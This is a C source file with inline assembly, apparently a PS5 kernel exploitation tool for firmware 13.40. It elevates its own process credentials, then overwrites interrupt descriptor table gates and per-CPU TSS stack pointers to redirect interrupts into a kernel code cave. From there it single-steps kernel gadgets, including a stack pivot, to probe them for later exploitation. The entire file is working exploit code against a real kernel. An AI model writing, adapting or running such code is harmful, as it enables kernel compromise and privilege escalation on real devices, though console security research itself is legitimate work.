/* 13.40 TF-oracle v3.1 — entry via vector 179, r0run-style resumption.
 *
 * enter179 (asm): saves callee-saved regs, builds a live user resume frame
 * {after_int, 0x43, live rfl, live rsp, 0x3b} and copyins it to the catch
 * slot (cave+0x2B0); shields all GPRs (but rsp); int $0xB3. Every return
 * path — stage-1 bounce (entry frame = copy of resume frame) and the TF #DB
 * catch (IDT[1] -> add_rsp_iret IST4 -> pops catch frame) — lands at
 * .after_int with rsp/rflags restored, then pops saved regs: clean ABI.
 *
 * Gates: IDT[179] = add_rsp_iret IST6 0xEE (ours alone; int3 untouched —
 * kstuff CFI hooks fire int3s in kernel context)
 *        IDT[1]   = add_rsp_iret IST4 0x8E (TF #DB catch)
 * Geometry (r0gdb-proven): hw frame at ist-0x28; add rsp,0xE8 pops 5-qword
 * frame at ist+0xC0 (rsp restored from frame).
 * gs = DATA_CAVE+0x20000: ist6=gs+0x440 (hw@+0x418, entry@+0x500),
 * ist4=gs+0x1F0 (#DB hw@+0x1C8, catch@+0x2B0).
 */
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <ps5/kernel.h>

#define CAVE_RVA 0x2D29000ULL
#define GS_OFF 0x20000ULL
#define IST4_TOP (CAVE_RVA + GS_OFF + 0x1F0ULL)
#define IST6_TOP (CAVE_RVA + GS_OFF + 0x440ULL)
#define SCRATCH_RVA (CAVE_RVA + 0x800ULL)
#define NATIVE1_RVA 0x268dc0ULL
#define ADD_RSP_RVA 0x257B36ULL
#define NOP_RET_RVA 0x255036ULL
#define PIVOT_RVA 0x25213EULL

static uint64_t g_rows[16];
static uint64_t g_save4[16], g_save6[16];
static uint8_t g_gate1[16], g_gate179[16];
volatile int g_stage;
volatile int g_marker;
volatile int g_do_int;
uint64_t g_nop, g_pivot, g_text, g_shield, g_catch, g_entry;

__attribute__((naked)) static void
enter179(void) {
  __asm__ volatile(
      "push %rbp\n push %rbx\n push %r12\n push %r13\n push %r14\n"
      " push %r15\n"
      "movl $1, g_marker(%rip)\n"
      "mov %rsp, %r11\n"
      "sub $8, %rsp\n"
      "sub $0x28, %rsp\n"
      "pushq $0x3b\n"
      "push %r11\n"
      "pushfq\n"
      "pushq $0x43\n"
      "lea 1f(%rip), %rax\n"
      "push %rax\n"
      "mov g_catch(%rip), %rdi\n"
      "mov %rsp, %rsi\n"
      "mov $40, %rdx\n"
      "movl $2, g_marker(%rip)\n"
      "call kernel_copyin\n"
      "movl $3, g_marker(%rip)\n"
      "cmpl $1, g_stage(%rip)\n"
      "jne 2f\n"
      "mov g_entry(%rip), %rdi\n"
      "mov %rsp, %rsi\n"
      "mov $40, %rdx\n"
      "movl $2, g_marker(%rip)\n"
      "call kernel_copyin\n"
      "movl $3, g_marker(%rip)\n"
      "2:\n"
      "add $0x58, %rsp\n"
      "movl $4, g_marker(%rip)\n"
      "cmpl $0, g_do_int(%rip)\n"
      "je 3f\n"
      "mov g_shield(%rip), %rax\n"
      "mov %rax, %rcx\n mov %rax, %rdx\n mov %rax, %rbx\n"
      "mov %rax, %rbp\n mov %rax, %rsi\n mov %rax, %rdi\n"
      "mov %rax, %r8\n mov %rax, %r9\n mov %rax, %r10\n mov %rax, %r11\n"
      "mov %rax, %r12\n mov %rax, %r13\n mov %rax, %r14\n mov %rax, %r15\n"
      "movl $5, g_marker(%rip)\n"
      "int $0xB3\n"
      "1:\n"
      "movl $6, g_marker(%rip)\n"
      "3:\n"
      "pop %r15\n pop %r14\n pop %r13\n pop %r12\n pop %rbx\n pop %rbp\n"
      "ret\n");
}

#include <signal.h>
static void
crash_handler(int sig, siginfo_t *si, void *uc) {
  (void)uc;
  char buf[96];
  int n = snprintf(buf, sizeof buf, "SIGNAL %d marker %d addr=%#llx\n",
                   sig, g_marker, (unsigned long long)si->si_addr);
  write(STDOUT_FILENO, buf, n);
  fsync(STDOUT_FILENO);
  _exit(99);
}

static int
readn(uint64_t a, void *b, size_t n) {
  return kernel_copyout((intptr_t)a, b, n);
}

static int
writen(uint64_t a, const void *b, size_t n) {
  return kernel_copyin(b, (intptr_t)a, n);
}

static void
mkgate(uint8_t *g, uint64_t target, uint8_t ist, uint8_t type) {
  uint16_t lo = (uint16_t)target, mid = (uint16_t)(target >> 16);
  uint32_t hi = (uint32_t)(target >> 32);
  memset(g, 0, 16);
  memcpy(g, &lo, 2);
  g[2] = 0x20;
  g[4] = ist;
  g[5] = type;
  memcpy(g + 6, &mid, 2);
  memcpy(g + 8, &hi, 4);
}

static uint64_t
gate_off(const uint8_t *g) {
  uint16_t lo = 0, mid = 0;
  uint32_t hi = 0;
  memcpy(&lo, g, 2);
  memcpy(&mid, g + 6, 2);
  memcpy(&hi, g + 8, 4);
  return ((uint64_t)hi << 32) | ((uint64_t)mid << 16) | lo;
}

int
main(void) {
  uint64_t data = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
  g_text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  uint64_t tss = data + 0x2ee6fe0ULL;
  uint64_t idt = data + 0x2ee4300ULL;
  uint64_t add_rsp = g_text + ADD_RSP_RVA;
  uint64_t gs = g_text + CAVE_RVA + GS_OFF;
  g_nop = g_text + NOP_RET_RVA;
  g_pivot = g_text + PIVOT_RVA;
  g_catch = gs + 0x2b0;
  g_entry = gs + 0x500;
  uint64_t frame[5];
  uint8_t *shield;
  uint8_t g1[16], g179[16];
  int fd = open("/data/oracle3_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd < 0)
    fd = open("/mnt/usb0/oracle3_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd >= 0) {
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if(fd > STDERR_FILENO)
      close(fd);
  }
  setvbuf(stdout, NULL, _IONBF, 0);
  {struct sigaction sa; memset(&sa,0,sizeof sa); sa.sa_sigaction=crash_handler; sa.sa_flags=SA_SIGINFO; sigaction(SIGSEGV,&sa,NULL);
  sigaction(SIGILL,&sa,NULL); sigaction(SIGBUS,&sa,NULL); sigaction(SIGFPE,&sa,NULL);}

  printf("oracle v3.3; fw=%#x text=%#" PRIx64 "\n", kernel_get_fw_version(),
         g_text);
  fsync(STDOUT_FILENO);
  if((kernel_get_fw_version() & 0xffff0000U) != 0x13400000U)
    return 1;
  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);

  if(readn(idt + 16, g1, 16) || readn(idt + 179 * 16, g179, 16)) {
    printf("gate read fail\n");
    return 2;
  }
  if(gate_off(g1) != g_text + NATIVE1_RVA || g1[5] != 0x8e ||
     gate_off(g179) != g_text + 0x268ef0ULL || g179[4] != 0 ||
     g179[5] != 0x8e) {
    printf("ABORT gates not native\n");
    return 3;
  }
  printf("gates native ok\n");
  memcpy(g_gate1, g1, 16);
  memcpy(g_gate179, g179, 16);
  fsync(STDOUT_FILENO);

  {
    uint64_t zeros[16];
    if(readn(gs + 0x800, zeros, sizeof zeros)) {
      printf("cave read fail\n");
      return 4;
    }
    for(size_t i = 0; i < 16; i++)
      if(zeros[i]) {
        printf("ABORT cave not zero\n");
        return 4;
      }
  }

  shield = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if(shield == MAP_FAILED) {
    printf("shield mmap fail\n");
    return 5;
  }
  memset(shield, 0, 0x100000);
  g_shield = (uint64_t)shield + 0x1000;

  for(int cpu = 0; cpu < 16; cpu++) {
    g_rows[cpu] = tss + (uint64_t)cpu * 0x68ULL;
    if(readn(g_rows[cpu] + 0x3c, &g_save4[cpu], 8) ||
       readn(g_rows[cpu] + 0x4c, &g_save6[cpu], 8)) {
      printf("tss read fail cpu=%d\n", cpu);
      return 6;
    }
    if(writen(g_rows[cpu] + 0x3c, &(uint64_t){g_text + IST4_TOP}, 8) ||
       writen(g_rows[cpu] + 0x4c, &(uint64_t){g_text + IST6_TOP}, 8)) {
      printf("tss arm fail cpu=%d\n", cpu);
      goto unwind;
    }
  }
  printf("tss ist4/ist6 -> cave x16\n");
  fsync(STDOUT_FILENO);

  /* T0: scaffolding without int (gate still native, g_do_int=0) */
  g_stage = 0;
  g_do_int = 0;
  enter179();
  g_marker = 7;
  printf("T0 scaffolding ok marker=%d\n", g_marker);
  fsync(STDOUT_FILENO);

  mkgate(g179, g_text + 0x257B3DULL, 6, 0xee);
  if(writen(idt + 179 * 16, g179, 16)) {
    printf("stage0 gate fail\n");
    goto unwind;
  }
  g_marker = 0;
  g_do_int = 1;
  enter179();
  printf("stage0 returned marker=%d\n", g_marker);
  if(readn(gs + 0x418, frame, sizeof frame)) {
    printf("stage0 hw unreadable\n");
    goto disarm;
  }
  printf("stage0 DORETI_BOUNCE_OK hw rip=%#" PRIx64 " cs=%#" PRIx64
         " rfl=%#" PRIx64 " rsp=%#" PRIx64 " ss=%#" PRIx64 "\n",
         frame[0], frame[1], frame[2], frame[3], frame[4]);
  printf("STAGE0_COMPLETE\n");
  fsync(STDOUT_FILENO);

  mkgate(g1, add_rsp, 4, 0x8e);
  mkgate(g179, add_rsp, 6, 0xee);
  if(writen(idt + 16, g1, 16) || writen(idt + 179 * 16, g179, 16)) {
    printf("gate arm fail\n");
    goto unwind;
  }
  printf("gates armed (idt1 ist4, idt179 ist6)\n");
  fsync(STDOUT_FILENO);

  /* stage 1: bounce — enter179 bootstraps the entry slot (g_stage==1)
   * with the resume frame it just built. */
  g_stage = 1;
  enter179();
  printf("stage1 returned\n");
  if(readn(gs + 0x418, frame, sizeof frame)) {
    printf("stage1 hw frame unreadable\n");
    goto disarm;
  }
  printf("stage1 BOUNCE_OK hw rip=%#" PRIx64 " cs=%#" PRIx64
         " rfl=%#" PRIx64 " rsp=%#" PRIx64 " ss=%#" PRIx64 "\n",
         frame[0], frame[1], frame[2], frame[3], frame[4]);
  fsync(STDOUT_FILENO);

  /* stage 2: TF-oracle on nop_ret */
  {
    uint64_t f[5] = {g_nop, 0x20, 0x102, g_text + SCRATCH_RVA, 0x28};
    uint64_t scratch0[8] = {g_nop, 0, 0, 0, 0, 0, 0, 0};
    if(writen(g_text + SCRATCH_RVA, scratch0, sizeof scratch0) ||
       writen(gs + 0x500, f, sizeof f)) {
      printf("stage2 plant fail\n");
      goto disarm;
    }
  }
  g_stage = 2;
  enter179();
  printf("stage2 returned\n");
  if(readn(gs + 0x1c8, frame, sizeof frame)) {
    memset(frame, 0, sizeof frame);
  }
  printf("stage2 dbframe rip=%#" PRIx64 " cs=%#" PRIx64 " rfl=%#" PRIx64
         " rsp=%#" PRIx64 "\n",
         frame[0], frame[1], frame[2], frame[3]);
  printf("nop_ret instr_len=%lld\n",
         (long long)((int64_t)frame[0] - (int64_t)g_nop));
  fsync(STDOUT_FILENO);

  /* stage 3: TF-oracle on PIVOT */
  {
    uint64_t f[5] = {g_pivot, 0x20, 0x102, g_text + SCRATCH_RVA, 0x28};
    if(writen(gs + 0x500, f, sizeof f)) {
      printf("stage3 plant fail\n");
      goto disarm;
    }
  }
  g_stage = 3;
  enter179();
  printf("stage3 returned\n");
  if(readn(gs + 0x1c8, frame, sizeof frame)) {
    memset(frame, 0, sizeof frame);
  }
  printf("stage3 dbframe rip=%#" PRIx64 " cs=%#" PRIx64 " rfl=%#" PRIx64
         " rsp=%#" PRIx64 " ss=%#" PRIx64 "\n",
         frame[0], frame[1], frame[2], frame[3], frame[4]);
  printf("PIVOT instr_len=%lld pivot_rsp=%#" PRIx64 "\n",
         (long long)((int64_t)frame[0] - (int64_t)g_pivot), frame[3]);
  printf("TF_ORACLE_OK\n");
  goto disarm;

disarm:
  writen(idt + 16, g_gate1, 16);
  writen(idt + 179 * 16, g_gate179, 16);
  printf("gates disarmed; g_stage=%d\n", g_stage);
  fsync(STDOUT_FILENO);

unwind:
  for(int cpu = 0; cpu < 16; cpu++) {
    writen(g_rows[cpu] + 0x3c, &g_save4[cpu], 8);
    writen(g_rows[cpu] + 0x4c, &g_save6[cpu], 8);
  }
  printf("done\n");
  fsync(STDOUT_FILENO);
  return 0;
}
